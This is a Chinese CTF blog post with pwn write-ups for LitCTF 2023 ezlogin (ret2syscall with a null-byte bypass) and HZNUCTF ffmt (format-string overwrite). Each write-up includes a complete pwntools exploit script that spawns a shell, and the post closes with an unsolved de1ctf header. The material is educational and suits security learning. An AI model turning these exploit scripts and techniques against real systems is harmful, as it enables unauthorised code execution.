<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>题录1.1 | S1nec-1o's B1og</title><meta name="author" content="s1nec-1o"><meta name="copyright" content="s1nec-1o"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="刷题记录2[LitCTF 2023]ezlogin首先是符号表的恢复，将随便一个libc.so的i64文件，拖到bindiff里，然后import即可恢复大部分的函数 静态分析12345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123;  const char **v3; &#x2F;&#x2F; rdx">
<meta property="og:type" content="article">
<meta property="og:title" content="题录1.1">
<meta property="og:url" content="http://s1nec-1o.github.io/2024/05/14/%E9%A2%98%E5%BD%951-01/index.html">
<meta property="og:site_name" content="S1nec-1o&#39;s B1og">
<meta property="og:description" content="刷题记录2[LitCTF 2023]ezlogin首先是符号表的恢复，将随便一个libc.so的i64文件，拖到bindiff里，然后import即可恢复大部分的函数 静态分析12345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123;  const char **v3; &#x2F;&#x2F; rdx">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png">
<meta property="article:published_time" content="2024-05-14T13:14:41.000Z">
<meta property="article:modified_time" content="2024-05-14T13:17:32.664Z">
<meta property="article:author" content="s1nec-1o">
<meta property="article:tag" content="traditional pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281712481.jpg"><link rel="canonical" href="http://s1nec-1o.github.io/2024/05/14/%E9%A2%98%E5%BD%951-01/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"距离文章发布已经过去","messageNext":"天了，信息可能已经过时"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '题录1.1',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-14 21:17:32'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 8 || hour >= 20
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="S1nec-1o's B1og" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><nav id="nav"><span id="blog-info"><a href="/" title="S1nec-1o's B1og"><span class="site-name">S1nec-1o's B1og</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">题录1.1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-14T13:14:41.000Z" title="发表于 2024-05-14 21:14:41">2024-05-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-14T13:17:32.664Z" title="更新于 2024-05-14 21:17:32">2024-05-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">做题记录</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="刷题记录2"><a href="#刷题记录2" class="headerlink" title="刷题记录2"></a>刷题记录2</h1><h1 id="LitCTF-2023-ezlogin"><a href="#LitCTF-2023-ezlogin" class="headerlink" title="[LitCTF 2023]ezlogin"></a>[LitCTF 2023]ezlogin</h1><p>首先是符号表的恢复，将随便一个libc.so的i64文件，拖到bindiff里，然后import即可恢复大部分的函数</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuffer(off_6B97A8, <span class="number">0LL</span>);</span><br><span class="line">  setbuffer(off_6B97A0, <span class="number">0LL</span>);</span><br><span class="line">  setbuffer(off_6B9798, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !vlun(&amp;v5, <span class="number">0LL</span>, v3) )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;GoodTime.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">vlun</span><span class="params">(<span class="type">int</span> v5, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">536</span>]; <span class="comment">// [rsp+0h] [rbp-218h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, v4, <span class="number">0x200</span>uLL) &gt; <span class="number">0x50</span>u )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  j_strcpy(*&amp;v5, v4);                           <span class="comment">// v5=v4</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcmp</span>(v4, <span class="string">&quot;PASSWORD&quot;</span>) == <span class="number">0</span>;           <span class="comment">// 不成立</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现v5处有个栈溢出，可以实现ret2syscall</p>
<p>其中的限制read发现汇编</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400C07 3C 50                         cmp     al, 50h <span class="comment">; &#x27;P&#x27;</span></span><br><span class="line">.text:0000000000400C09 77 33                         ja      short loc_400C3E</span><br></pre></td></tr></table></figure>

<p>主要是如果al&gt;50h的话就会exit，而显然al只有一个字节8位，所以只要刚好当al&#x3D;0的时候即他的低位&lt;&#x3D;50h即可（学到了，还可以这样搞</p>
<p>接下来就是要思考如何绕过strcpy的\x00截断了，因为我们的rop链显然会有大量的\x00</p>
<p>如何绕过呢？有一个思路就是先把已经构造好的rop链将\x00都替换成A传进去，然后再一字节一字节更改位\x00</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gadget</span>(<span class="params">content</span>):</span><br><span class="line">    content = content + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    content = content[-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content)):</span><br><span class="line">        <span class="keyword">if</span> content[i] == <span class="number">0</span>:</span><br><span class="line">            payload = content[i+<span class="number">1</span>:][-<span class="number">1</span>::-<span class="number">1</span>].replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">            padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">            log.success(<span class="string">&#x27;Payload: &#x27;</span> + (<span class="built_in">str</span>(payload)))</span><br><span class="line">            io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, padding + payload)</span><br></pre></td></tr></table></figure>

<p>这个脚本主要是绕过\x00截断的，然后他是先把payload的\x00都换成A，然后将payload倒置过来，之后找到第一个\x00将其之后的，即倒置过来看就是找到最后一个\x00将其的之前所有的\x00都替换为A然后输入，之后就是从\x00之前再寻找最后一个\x00一直重复找，就可以将所有的字节输入进去辣，（使我的大脑无限旋转</p>
<p>之后的rop链就很简单构造了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ezlogin&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node5.anna.nssctf.cn&#x27;,29142)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezlogin&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bamboo/glibc-all-in-one-master/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Max Padding size : 0x100 - 0x150</span></span><br><span class="line"><span class="comment"># Define registers</span></span><br><span class="line">rax = <span class="number">0x4005AF</span></span><br><span class="line">rdi = <span class="number">0x400706</span></span><br><span class="line">rsi = <span class="number">0x410043</span></span><br><span class="line">rdx = <span class="number">0x448C95</span></span><br><span class="line">syscall = <span class="number">0x448D5F</span></span><br><span class="line">bss = <span class="number">0x6BB300</span></span><br><span class="line">main = <span class="number">0x4005C0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create func use to replace &#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gadget</span>(<span class="params">content</span>):</span><br><span class="line">    content = content + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    content = content[-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content)):</span><br><span class="line">        <span class="keyword">if</span> content[i] == <span class="number">0</span>:</span><br><span class="line">            payload = content[i+<span class="number">1</span>:][-<span class="number">1</span>::-<span class="number">1</span>].replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">            padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">            log.success(<span class="string">&#x27;Payload: &#x27;</span> + (<span class="built_in">str</span>(payload)))</span><br><span class="line">            io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, padding + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage one</span></span><br><span class="line"><span class="comment"># read(0, 0, bss)</span></span><br><span class="line"><span class="comment"># rax 系统调用号 0代表 read</span></span><br><span class="line"><span class="comment"># rdi 第一参数</span></span><br><span class="line"><span class="comment"># 0 fd</span></span><br><span class="line"><span class="comment"># rsi 第二参数</span></span><br><span class="line"><span class="comment"># bss /bin/sh 地址</span></span><br><span class="line"><span class="comment"># 此处无法填写rdx的寄存器与值，因为如果填写了会导致Payload溢出，a1寄存器为58，就会进入exit函数。</span></span><br><span class="line"><span class="comment"># 但是程序在此时的rdx值够存放很多数据，所以存放一个/bin/sh不是什么难事。</span></span><br><span class="line">debug()</span><br><span class="line">Payload = p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>) + p64(rsi) + p64(bss) + p64(syscall) + p64(main)</span><br><span class="line">gadget(Payload)</span><br><span class="line">Payload = <span class="string">b&#x27;PASSWORD\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, Payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage two</span></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line"><span class="comment"># rax 系统调用号 59代表 execve</span></span><br><span class="line"><span class="comment"># rdi 第一参数</span></span><br><span class="line"><span class="comment"># bss /bin/sh 地址</span></span><br><span class="line"><span class="comment"># rsi 第二参数</span></span><br><span class="line"><span class="comment"># 0 NULL</span></span><br><span class="line"><span class="comment"># rdx 第三参数</span></span><br><span class="line"><span class="comment"># 0 NULL</span></span><br><span class="line">Payload = p64(rax) + p64(<span class="number">59</span>) + p64(rdi) + p64(bss) + p64(rsi) + p64(<span class="number">0</span>) + p64(rdx) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">gadget(Payload)</span><br><span class="line">Payload = <span class="string">b&#x27;PASSWORD\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, Payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="HZNUCTF-2023-preliminary-ffmt"><a href="#HZNUCTF-2023-preliminary-ffmt" class="headerlink" title="[HZNUCTF 2023 preliminary]ffmt"></a>[HZNUCTF 2023 preliminary]ffmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115387.png" alt="image-20240512200725094"></p>
<h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to HCNUCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;, hell0, please say something about yourself~&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现一个格式化字符串漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里还有一个，程序中有个backdoor，因此想的是改尾巴一个字节到backdoor，因此就能想到第一个格式化字符串漏洞泄露栈地址，然后第二个直接改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./ffmt&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">25151</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your name: \n&#x27;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">r(<span class="number">2</span>)</span><br><span class="line">ret_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x140</span>+<span class="number">48</span></span><br><span class="line">leak(<span class="string">&#x27;ret_addr&#x27;</span>,ret_addr)</span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;%35c%8$hhnaaaaaa&#x27;</span> + p64(ret_addr)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sla(<span class="string">b&#x27;yourself~\n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>

<p>很经典的格式化字符串漏洞</p>
<blockquote>
<p>64位格式字符串漏洞的偏移到栈上是从rsp下面一个开始的</p>
<ul>
<li>%hhn 写一字节</li>
<li>%hn 写两字节</li>
<li>%n 把已经成功输出的字符个数写入对应的整型指针参数所指的变量。将栈上的内容作为地址解析，然后改变这个地址上的内容，写四字节</li>
<li>%ln 32位写四字节，64位写八字节</li>
<li>%lln 写八字节</li>
</ul>
</blockquote>
<p>太久没做都着了道了</p>
<h1 id="de1ctf-2019-unprintable"><a href="#de1ctf-2019-unprintable" class="headerlink" title="de1ctf_2019_unprintable"></a>de1ctf_2019_unprintable</h1><p>本题的环境是libc-2.23.so的，如果版本不一样会导致栈空间不一样不能getshell（一晚上(lll￢ω￢)得来的</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115389.png" alt="image-20240512214109727"></p>
